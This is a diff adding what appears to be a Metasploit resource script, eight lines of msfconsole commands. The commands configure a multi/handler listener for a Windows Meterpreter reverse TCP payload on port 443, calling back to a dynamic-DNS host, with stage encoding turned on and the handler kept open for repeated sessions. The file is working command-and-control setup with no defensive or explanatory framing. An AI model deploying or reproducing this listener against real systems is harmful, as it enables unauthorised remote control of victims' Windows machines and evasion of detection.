@@ -1,0 +1,8 @@
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 443
+set LHOST kalilinuxhost.ddns.net
+set EnableStageEncoding true
+set ExitOnSession false
+
